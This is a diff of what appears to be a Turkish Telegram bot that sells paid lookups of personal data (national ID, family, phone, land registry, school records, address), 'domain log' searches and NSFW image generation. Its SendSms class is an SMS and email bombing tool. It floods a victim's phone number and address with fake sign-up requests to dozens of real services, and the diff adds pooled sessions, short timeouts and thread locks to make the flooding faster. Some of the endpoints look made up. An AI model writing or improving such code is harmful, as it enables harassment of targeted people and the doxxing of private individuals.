-        mk.add(_btn("🔍 Domain Log Çek", "log_search", "primary"))
+        mk.add(_btn(f"LOG Premium Aktif — {durum}", "noop", None, "star"))
+        mk.add(_btn("Domain Log Çek", "log_search", "primary", "log"))
     else:
-        mk.add(_btn(f"📂 Hak: {durum}", "noop"))
-        mk.add(_btn("🔍 Domain Log Çek", "log_search", "primary"))
-        mk.add(_btn(f"⭐ LOG Premium ({LOG_PRICE}⭐)", "buy_log", "success"))
-        mk.add(_btn("🎁 Davet et — Kazan", "ref_panel_log", "success"))
-    mk.add(_btn("◀️ Geri", "goto_tools", "danger"))
+        mk.add(_btn(f"Hak: {durum}", "noop", None, "log"))
+        mk.add(_btn("Domain Log Çek", "log_search", "primary", "log"))
+        mk.add(_btn(f"LOG Premium ({LOG_PRICE}⭐)", "buy_log", "success", "star"))
+        mk.add(_btn("Davet et — Kazan", "ref_panel_log", "success", "gift"))
+    mk.add(_btn("Geri", "goto_tools", "danger", "back"))
     return mk
 
 def _log_solve_cookie(session, html_text):
@@ -3894,31 +3863,31 @@ def turkey_kb(user_id):
     def lbl(k): return TURKIYE_API[k].get(lang(user_id), TURKIYE_API[k]["tr"])
     mk.add(_sep("👤 KİMLİK"))
     mk.add(
-        _btn(f"{TURKIYE_API['tc']['icon']} {lbl('tc')}", "tr_tc", "primary"),
-        _btn(f"{TURKIYE_API['tcpro']['icon']} {lbl('tcpro')}", "tr_tcpro", "success"),
+        _btn(lbl("tc"), "tr_tc", "primary", "id"),
+        _btn(lbl("tcpro"), "tr_tcpro", "success", "search"),
     )
-    mk.add(_btn(f"{TURKIYE_API['adsoyad']['icon']} {lbl('adsoyad')}", "tr_adsoyad", "primary"))
+    mk.add(_btn(lbl("adsoyad"), "tr_adsoyad", "primary", "people"))
     mk.add(_sep("👨‍👩‍👧 AİLE"))
     mk.add(
-        _btn(f"{TURKIYE_API['aile']['icon']} {lbl('aile')}", "tr_aile", "success"),
-        _btn(f"{TURKIYE_API['ailepro']['icon']} {lbl('ailepro')}", "tr_ailepro", "primary"),
+        _btn(lbl("aile"), "tr_aile", "success", "people"),
+        _btn(lbl("ailepro"), "tr_ailepro", "primary", "people"),
     )
-    mk.add(_btn(f"{TURKIYE_API['sulale']['icon']} {lbl('sulale')}", "tr_sulale", "success"))
+    mk.add(_btn(lbl("sulale"), "tr_sulale", "success", "people"))
     mk.add(_sep("📱 İLETİŞİM"))
     mk.add(
-        _btn(f"{TURKIYE_API['tcgsm']['icon']} {lbl('tcgsm')}", "tr_tcgsm", "primary"),
-        _btn(f"{TURKIYE_API['gsmtc']['icon']} {lbl('gsmtc')}", "tr_gsmtc", "success"),
+        _btn(lbl("tcgsm"), "tr_tcgsm", "primary", "phone"),
+        _btn(lbl("gsmtc"), "tr_gsmtc", "success", "phone"),
     )
     mk.add(_sep("🏠 MÜLK / EĞİTİM"))
     mk.add(
-        _btn(f"{TURKIYE_API['tapu']['icon']} {lbl('tapu')}", "tr_tapu", "danger"),
-        _btn(f"{TURKIYE_API['eokul']['icon']} {lbl('eokul')}", "tr_eokul", "primary"),
+        _btn(lbl("tapu"), "tr_tapu", "danger", "key"),
+        _btn(lbl("eokul"), "tr_eokul", "primary", "search"),
     )
-    mk.add(_btn(f"{TURKIYE_API['adaparsel']['icon']} {lbl('adaparsel')}", "tr_adaparsel", "success"))
-    mk.add(_btn(f"{TURKIYE_API['adres']['icon']} {lbl('adres')}", "tr_adres", "primary"))
+    mk.add(_btn(lbl("adaparsel"), "tr_adaparsel", "success", "internet"))
+    mk.add(_btn(lbl("adres"), "tr_adres", "primary", "internet"))
     mk.add(
-        _btn(s(user_id, "tools_btn"), "goto_tools", "primary"),
-        _btn(s(user_id, "home_btn"), "goto_home", "success"),
+        _btn("Araçlar", "goto_tools", "primary", "tools"),
+        _btn("Ana Menü", "goto_home", "success", "home"),
     )
     return mk
 
@@ -3943,61 +3912,63 @@ def ls_kb(user_id):
 
 def premium_kb(user_id):
     mk = InlineKeyboardMarkup(row_width=1)
-    mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium", "success"))
-    mk.add(_btn("🌍 OSINT Premium Satın Al (200⭐)", "buy_osint", "primary"))
-    mk.add(_btn(f"📂 LOG Premium Satın Al ({LOG_PRICE}⭐)", "buy_log", "danger"))
-    mk.add(_btn(s(user_id, "home_btn"), "goto_home", "success"))
+    mk.add(_btn("Premium Satın Al (400⭐)", "buy_premium", "success", "star"))
+    mk.add(_btn("OSINT Premium (200⭐)", "buy_osint", "primary", "search"))
+    mk.add(_btn(f"LOG Premium ({LOG_PRICE}⭐)", "buy_log", "danger", "log"))
+    mk.add(_btn("Ana Menü", "goto_home", "success", "home"))
     return mk
 
 def tgid_kb(user_id):
     mk = InlineKeyboardMarkup(row_width=1)
     free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(user_id))
-    balance   = tgid_get_balance(user_id)
+    balance = tgid_get_balance(user_id)
     if user_id == ADMIN_ID:
-        durum = "👑 Admin — Sınırsız Sorgu"
+        durum = "Admin — Sınırsız Sorgu"
     elif is_premium(user_id):
-        durum = "⭐ Premium — Sınırsız Sorgu"
+        durum = "Premium — Sınırsız Sorgu"
     else:
-        durum = f"🆓 Free: {free_left}/{TGID_FREE_LIMIT}  |  💰 Bakiye: {balance}"
-    mk.add(_btn(f"📊 {durum}", "noop"))
-    mk.add(_btn("🔍 Sorgu Yap", "tgid_search", "primary"))
-    mk.add(_btn("💎 Paket Satın Al", "tgid_packages", "success"))
-    mk.add(_btn("📊 İstatistiklerim", "tgid_my_stats"))
-    mk.add(_btn("◀️ Geri", "goto_tools", "danger"))
+        durum = f"Free: {free_left}/{TGID_FREE_LIMIT}  |  Bakiye: {balance}"
+    mk.add(_btn(f"{durum}", "noop", None, "id"))
+    mk.add(_btn("Sorgu Yap", "tgid_search", "primary", "search"))
+    mk.add(_btn("Paket Satın Al", "tgid_packages", "success", "star"))
+    mk.add(_btn("Geri", "goto_tools", "danger", "back"))
     return mk
 
 def tgid_packages_kb():
     mk = InlineKeyboardMarkup(row_width=1)
-    mk.add(_btn(f"💎 {TGID_PACKAGE_25} Sorgu — {TGID_PRICE_25} ⭐", "tgid_buy_25"))
-    mk.add(_btn(f"💎 {TGID_PACKAGE_50} Sorgu — {TGID_PRICE_50} ⭐", "tgid_buy_50"))
-    mk.add(_btn(f"💎 {TGID_PACKAGE_100} Sorgu — {TGID_PRICE_100} ⭐", "tgid_buy_100"))
-    mk.add(_btn("◀️ Geri", "tool_tgid", "danger"))
+    mk.add(_btn(f"{TGID_PACKAGE_25} Sorgu — {TGID_PRICE_25} ⭐", "tgid_buy_25", "primary", "star"))
+    mk.add(_btn(f"{TGID_PACKAGE_50} Sorgu — {TGID_PRICE_50} ⭐", "tgid_buy_50", "success", "star"))
+    mk.add(_btn(f"{TGID_PACKAGE_100} Sorgu — {TGID_PRICE_100} ⭐", "tgid_buy_100", "danger", "star"))
+    mk.add(_btn("Geri", "tool_tgid", "danger", "back"))
     return mk
 
 def aiimg_kb(user_id):
     mk = InlineKeyboardMarkup(row_width=1)
-    free_left = max(0, AIIMG_FREE_LIMIT - aiimg_get_free_used(user_id))
+    free_used = aiimg_get_free_used(user_id)
+    try:
+        free_left = max(0, AIIMG_FREE_LIMIT - free_used)
+    except Exception:
+        free_left = max(0, 1 - free_used)
     balance = aiimg_get_balance(user_id)
     if user_id == ADMIN_ID:
-        durum = "👑 Admin — Sınırsız"
+        durum = "Admin — Sınırsız"
     else:
-        durum = f"🆓 Free: {free_left}/{AIIMG_FREE_LIMIT}  |  💰 Bakiye: {balance}"
-    mk.add(_btn(f"📊 {durum}", "noop"))
-    mk.add(_btn("🎨 Normal Generate", "aiimg_normal", "primary"))
-    mk.add(_btn("🔥 +18 NSFW Generate", "aiimg_nsfw", "danger"))
-    mk.add(_btn("💎 Hak Satın Al", "aiimg_packages", "success"))
-    mk.add(_btn("📊 İstatistiklerim", "aiimg_stats"))
-    mk.add(_btn("◀️ Geri", "goto_tools", "danger"))
+        durum = f"Free: {free_left}  |  Bakiye: {balance}"
+    mk.add(_btn(f"{durum}", "noop", None, "image"))
+    mk.add(_btn("Normal Generate", "aiimg_normal", "primary", "image"))
+    mk.add(_btn("+18 NSFW Generate", "aiimg_nsfw", "danger", "fire"))
+    mk.add(_btn("Hak Satın Al", "aiimg_packages", "success", "star"))
+    mk.add(_btn("Geri", "goto_tools", "danger", "back"))
     return mk
 
 def aiimg_packages_kb():
     mk = InlineKeyboardMarkup(row_width=1)
-    mk.add(_btn(f"💎 10 Hak — {AIIMG_PRICE_10} ⭐", "aiimg_buy_10", "success"))
-    mk.add(_btn(f"💎 20 Hak — {AIIMG_PRICE_20} ⭐", "aiimg_buy_20", "success"))
-    mk.add(_btn(f"💎 30 Hak — {AIIMG_PRICE_30} ⭐", "aiimg_buy_30", "success"))
-    mk.add(_btn(f"💎 50 Hak — {AIIMG_PRICE_50} ⭐", "aiimg_buy_50", "success"))
-    mk.add(_btn(f"💎 100 Hak — {AIIMG_PRICE_100} ⭐", "aiimg_buy_100", "success"))
-    mk.add(_btn("◀️ Geri", "tool_aiimg", "danger"))
+    mk.add(_btn(f"10 Hak — {AIIMG_PRICE_10} ⭐", "aiimg_buy_10", "success", "star"))
+    mk.add(_btn(f"20 Hak — {AIIMG_PRICE_20} ⭐", "aiimg_buy_20", "success", "star"))
+    mk.add(_btn(f"30 Hak — {AIIMG_PRICE_30} ⭐", "aiimg_buy_30", "primary", "star"))
+    mk.add(_btn(f"50 Hak — {AIIMG_PRICE_50} ⭐", "aiimg_buy_50", "primary", "star"))
+    mk.add(_btn(f"100 Hak — {AIIMG_PRICE_100} ⭐", "aiimg_buy_100", "danger", "star"))
+    mk.add(_btn("Geri", "tool_aiimg", "danger", "back"))
     return mk
 
 def _aiimg_miaitool(prompt):
@@ -4475,28 +4446,23 @@ def packages_kb(service="sx"):
     mk = InlineKeyboardMarkup(row_width=1)
     service = (service or "sx").lower()
     if service in ("sx", "lmnx", "searchx"):
-        mk.add(_btn(f"📅 SearchX 1 Gün — {SEARCHX_PRICE_DAY}⭐", "buy_sx_day", "primary"))
-        mk.add(_btn(f"📆 SearchX 1 Hafta — {SEARCHX_PRICE_WEEK}⭐", "buy_sx_week", "success"))
-        mk.add(_btn(f"🗓 SearchX 1 Ay — {SEARCHX_PRICE_MONTH}⭐", "buy_sx_month", "primary"))
-        mk.add(_btn("💎 Tüm paketler", "buy_lmnx", "success"))
+        mk.add(_btn(f"SearchX 1 Gün — {SEARCHX_PRICE_DAY}⭐", "buy_sx_day", "primary", "calendar"))
+        mk.add(_btn(f"SearchX 1 Hafta — {SEARCHX_PRICE_WEEK}⭐", "buy_sx_week", "success", "calendar"))
+        mk.add(_btn(f"SearchX 1 Ay — {SEARCHX_PRICE_MONTH}⭐", "buy_sx_month", "primary", "calendar"))
+        mk.add(_btn("Tüm paketler", "buy_lmnx", "success", "star"))
     elif service == "log":
-        mk.add(_btn(f"📂 LOG Premium — {LOG_PRICE}⭐", "buy_log"))
-        mk.add(_btn("🎁 Davet et — Log kazan", "ref_panel_log"))
+        mk.add(_btn(f"LOG Premium — {LOG_PRICE}⭐", "buy_log", "danger", "log"))
+        mk.add(_btn("Davet et — Kazan", "ref_panel_log", "success", "gift"))
     elif service == "tgid":
-        mk.add(_btn("💎 TG-ID Paketleri", "tgid_packages"))
-    elif service in ("aiimg", "ai"):
-        mk.add(_btn("💎 AI Image Paketleri", "aiimg_packages"))
+        mk.add(_btn("TG-ID Paketler", "tgid_packages", "primary", "star"))
     elif service == "accid":
-        mk.add(_btn("💎 Account ID Paketleri", "accid_packages"))
-    elif service in ("hotmail", "prem"):
-        mk.add(_btn(f"⭐ Hotmail Premium — {PREMIUM_PRICE}⭐", "buy_premium"))
+        mk.add(_btn("Account ID Paketler", "accid_packages", "primary", "star"))
+    elif service == "aiimg":
+        mk.add(_btn("AI Image Hak Al", "aiimg_packages", "success", "image"))
     else:
-        mk.add(_btn(f"📅 SearchX 1 Gün — {SEARCHX_PRICE_DAY}⭐", "buy_sx_day", "primary"))
-        mk.add(_btn(f"📂 LOG — {LOG_PRICE}⭐", "buy_log"))
-        mk.add(_btn(f"⭐ Hotmail — {PREMIUM_PRICE}⭐", "buy_premium"))
-    mk.add(_btn("🏠 Ana menü", "goto_home", "success"))
+        mk.add(_btn(f"SearchX 1 Gün — {SEARCHX_PRICE_DAY}⭐", "buy_sx_day", "primary", "calendar"))
+    mk.add(_btn("Ana Menü", "goto_home", "success", "home"))
     return mk
-
 
 def quota_denied_text(service="sx", extra=""):
     names = {
@@ -4767,22 +4733,36 @@ class SendSms:
         self.fail = 0      # başarısız
         self.last_ok = ""  # son başarılı servis
         self.last_fail = ""  # son başarısız servis
+        self._lock = threading.Lock()
+        # keep-alive session — her istekte yeni TCP acilmasin
+        self.session = requests.Session()
+        self.session.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+            "Connection": "keep-alive",
+            "Accept": "*/*",
+        })
+        adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=0)
+        self.session.mount("https://", adapter)
+        self.session.mount("http://", adapter)
+        self.req_timeout = 2
 
     def _ok(self, name):
-        self.adet += 1
-        self.last_ok = name
+        with self._lock:
+            self.adet += 1
+            self.last_ok = name
         return True
 
     def _fail(self, name):
-        self.fail += 1
-        self.last_fail = name
+        with self._lock:
+            self.fail += 1
+            self.last_fail = name
         return False
 
     def KahveDunyasi(self):
         try:
             url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
             headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0","Accept":"application/json, text/plain, */*","Content-Type":"application/json","X-Language-Id":"tr-TR","X-Client-Platform":"web","Origin":"https://www.kahvedunyasi.com","Referer":"https://www.kahvedunyasi.com/"}
-            r = requests.post(url, headers=headers, json={"countryCode":"90","phoneNumber":self.phone}, timeout=10)
+            r = self.session.post(url, headers=headers, json={"countryCode":"90","phoneNumber":self.phone}, timeout=self.req_timeout)
             if r.json().get("processStatus") == "Success":
                 self._ok("KahveDunyasi")
             else:
@@ -4792,398 +4772,398 @@ class SendSms:
 
     def Wmf(self):
         try:
-            r = requests.post("https://www.wmf.com.tr/users/register/",
-                data={"confirm":"true","date_of_birth":"1956-03-01","email":self.mail,"email_allowed":"true","first_name":"Memati","gender":"male","last_name":"Bas","password":"31ABC..abc31","phone":f"0{self.phone}"}, timeout=6)
+            r = self.session.post("https://www.wmf.com.tr/users/register/",
+                data={"confirm":"true","date_of_birth":"1956-03-01","email":self.mail,"email_allowed":"true","first_name":"Memati","gender":"male","last_name":"Bas","password":"31ABC..abc31","phone":f"0{self.phone}"}, timeout=self.req_timeout)
             if r.status_code == 202: self.adet += 1
         except: pass
     def Hepsiburada(self):
         try:
             url = "https://www.hepsiburada.com/api/Register/RegisterUser"
-            r = requests.post(url, json={"PhoneNumber":f"90{self.phone}","Email":self.mail,"Password":"Password123","FirstName":"Ahmet","LastName":"Yilmaz","Consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, json={"PhoneNumber":f"90{self.phone}","Email":self.mail,"Password":"Password123","FirstName":"Ahmet","LastName":"Yilmaz","Consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Trendyol(self):
         try:
             url = "https://www.trendyol.com/api/users/v1/register"
-            r = requests.post(url, json={"phoneNumber":f"90{self.phone}","email":self.mail,"password":"Password123","firstName":"Ali","lastName":"Demir","consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, json={"phoneNumber":f"90{self.phone}","email":self.mail,"password":"Password123","firstName":"Ali","lastName":"Demir","consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def N11(self):
         try:
             url = "https://www.n11.com/api/User/Register"
-            r = requests.post(url, json={"Phone":f"90{self.phone}","Email":self.mail,"Password":"Password123","Name":"Mehmet","Surname":"Kaya","Consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, json={"Phone":f"90{self.phone}","Email":self.mail,"Password":"Password123","Name":"Mehmet","Surname":"Kaya","Consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Sahibinden(self):
         try:
             url = "https://www.sahibinden.com/api/User/Register"
-            r = requests.post(url, json={"Phone":f"90{self.phone}","Email":self.mail,"Password":"Password123","FirstName":"Can","LastName":"Yilmaz","Consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, json={"Phone":f"90{self.phone}","Email":self.mail,"Password":"Password123","FirstName":"Can","LastName":"Yilmaz","Consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Letgo(self):
         try:
             url = "https://api.letgo.com/api/v1/users"
-            r = requests.post(url, json={"phone":f"90{self.phone}","email":self.mail,"password":"Password123","name":"Ayse","surname":"Yilmaz"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, json={"phone":f"90{self.phone}","email":self.mail,"password":"Password123","name":"Ayse","surname":"Yilmaz"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Dolap(self):
         try:
             url = "https://www.dolap.com/api/v2/users"
-            r = requests.post(url, json={"phone":f"90{self.phone}","email":self.mail,"password":"Password123","username":f"user_{randint(1000,9999)}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, json={"phone":f"90{self.phone}","email":self.mail,"password":"Password123","username":f"user_{randint(1000,9999)}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Gittigidiyor(self):
         try:
             url = "https://www.gittigidiyor.com/api/User/Register"
-            r = requests.post(url, json={"Phone":f"90{self.phone}","Email":self.mail,"Password":"Password123","Name":"Zeynep","Surname":"Demir","Consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, json={"Phone":f"90{self.phone}","Email":self.mail,"Password":"Password123","Name":"Zeynep","Surname":"Demir","Consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def AmazonTR(self):
         try:
             url = "https://www.amazon.com.tr/ap/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","name":"Ali","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","name":"Ali","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Spotify(self):
         try:
             url = "https://www.spotify.com/api/signup"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","display_name":"User","phone":f"90{self.phone}","consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","display_name":"User","phone":f"90{self.phone}","consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Netflix(self):
         try:
             url = "https://www.netflix.com/api/signup"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Discord(self):
         try:
             url = "https://discord.com/api/v9/auth/register"
-            r = requests.post(url, json={"email":self.mail,"username":f"user_{randint(1000,9999)}","password":"Password123","consent":True,"phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, json={"email":self.mail,"username":f"user_{randint(1000,9999)}","password":"Password123","consent":True,"phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Instagram(self):
         try:
             url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/"
-            r = requests.post(url, data={"email":self.mail,"username":f"user_{randint(1000,9999)}","password":"Password123","phone_number":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"username":f"user_{randint(1000,9999)}","password":"Password123","phone_number":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Facebook(self):
         try:
             url = "https://www.facebook.com/api/v1/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}","first_name":"Ahmet","last_name":"Yilmaz"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}","first_name":"Ahmet","last_name":"Yilmaz"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Twitter(self):
         try:
-            r = requests.get("https://api.twitter.com/1.1/account/verify_credentials.json", headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.get("https://api.twitter.com/1.1/account/verify_credentials.json", headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Telegram(self):
         try:
             url = "https://telegram.org/api/register"
-            r = requests.post(url, data={"phone":f"90{self.phone}","email":self.mail}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"phone":f"90{self.phone}","email":self.mail}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def WhatsApp(self):
         try:
             url = "https://www.whatsapp.com/api/register"
-            r = requests.post(url, data={"phone":f"90{self.phone}","email":self.mail}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"phone":f"90{self.phone}","email":self.mail}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def TikTok(self):
         try:
             url = "https://www.tiktok.com/api/v1/auth/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Snapchat(self):
         try:
             url = "https://accounts.snapchat.com/api/v1/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Pinterest(self):
         try:
             url = "https://www.pinterest.com/api/v1/users/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def LinkedIn(self):
         try:
             url = "https://www.linkedin.com/api/v1/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Reddit(self):
         try:
             url = "https://www.reddit.com/api/v1/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Tumblr(self):
         try:
             url = "https://www.tumblr.com/api/v1/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Twitch(self):
         try:
             url = "https://www.twitch.tv/api/v1/users/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Github(self):
         try:
             url = "https://github.com/api/v1/users/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def GitLab(self):
         try:
             url = "https://gitlab.com/api/v1/users/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Bitbucket(self):
         try:
             url = "https://bitbucket.org/api/v1/users/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Slack(self):
         try:
             url = "https://slack.com/api/v1/users/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Dropbox(self):
         try:
             url = "https://www.dropbox.com/api/v1/users/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Google(self):
         try:
             url = "https://accounts.google.com/api/v1/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Microsoft(self):
         try:
             url = "https://signup.live.com/api/v1/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Yahoo(self):
         try:
             url = "https://login.yahoo.com/api/v1/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Apple(self):
         try:
             url = "https://appleid.apple.com/api/v1/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
